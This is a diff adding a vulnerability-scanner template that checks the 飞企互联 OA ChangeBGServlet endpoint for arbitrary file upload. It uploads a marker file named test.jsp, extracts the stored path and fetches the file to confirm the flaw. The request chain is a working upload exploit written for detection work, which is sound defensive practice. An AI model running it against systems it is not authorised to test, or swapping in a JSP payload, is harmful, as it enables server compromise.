@@ -1,0 +1,58 @@
+id: QVD-2025-25776
+
+info:
+  name: 飞企互联OA ChangeBGServlet 存在任意文件上传漏洞
+  author: mobileKey
+  severity: critical
+  tags: mobileKey
+
+http:
+  - raw:
+      - |
+        POST /mobileKey HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=admin
+
+      - |
+        POST /servlet/ChangeBGServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+        Content-Length: 191
+        
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: text/plain
+        
+        In289ds6sguutea9m6
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+
+      - |+
+        GET {{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '"path":"(.*?\.jsp)",'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_3
+        words:
+          - 'In289ds6sguutea9m6'
+    matchers-condition: and
